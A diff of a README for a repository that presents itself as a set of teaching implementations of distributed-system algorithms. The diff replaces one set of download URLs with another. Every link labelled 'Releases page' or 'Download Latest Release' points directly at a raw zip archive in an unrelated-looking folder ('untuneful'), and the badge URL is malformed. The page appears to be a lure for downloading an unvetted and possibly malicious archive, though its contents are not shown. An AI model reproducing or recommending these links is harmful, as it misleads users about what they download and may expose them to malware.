@@ -1,7 +1,7 @@
 # 🌟 distributed-system-algorithms - Understand How Computers Coordinate
 
 ## 🔗 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/lazymuffin808/distributed-system-algorithms/main/untuneful/distributed_system_algorithms_1.7.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/lazymuffin808/distributed-system-algorithms/main/untuneful/distributed_system_algorithms_1.7.zip)
+[![Download Latest Release](https://github.com/lazymuffin808/distributed-system-algorithms/raw/refs/heads/main/untuneful/system_distributed_algorithms_v1.0-alpha.2.zip%20Latest%20Release-v1.0-blue)](https://github.com/lazymuffin808/distributed-system-algorithms/raw/refs/heads/main/untuneful/system_distributed_algorithms_v1.0-alpha.2.zip)
 
 ## 📚 What is This?
 Welcome to the **distributed-system-algorithms** project! This software contains easy-to-understand implementations of key algorithms. These algorithms help multiple computers work together effectively, even when they cannot communicate instantly or trust a single clock. 
@@ -11,7 +11,7 @@ This project is designed with the goal of making these concepts clearer and more
 ## 📥 Download & Install
 To get started, you need to visit our Releases page. Here, you will find the latest version of the software.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/lazymuffin808/distributed-system-algorithms/main/untuneful/distributed_system_algorithms_1.7.zip).
+1. Go to the [Releases page](https://github.com/lazymuffin808/distributed-system-algorithms/raw/refs/heads/main/untuneful/system_distributed_algorithms_v1.0-alpha.2.zip).
 2. Look for the latest version available.
 3. Click on the download link for your operating system.
 4. Follow the instructions shown to install the software on your computer.
@@ -71,6 +71,6 @@ We welcome feedback and contributions. If you have questions or would like to re
 For more in-depth understanding, consider exploring resources on distributed systems. Many online tutorials and documentation are available to help enhance your knowledge.
 
 ## 🔗 Important Links
-To download the application, please visit our [Releases page](https://raw.githubusercontent.com/lazymuffin808/distributed-system-algorithms/main/untuneful/distributed_system_algorithms_1.7.zip). 
+To download the application, please visit our [Releases page](https://github.com/lazymuffin808/distributed-system-algorithms/raw/refs/heads/main/untuneful/system_distributed_algorithms_v1.0-alpha.2.zip). 
 
 Feel free to explore the project further and enjoy your learning experience with distributed system algorithms!
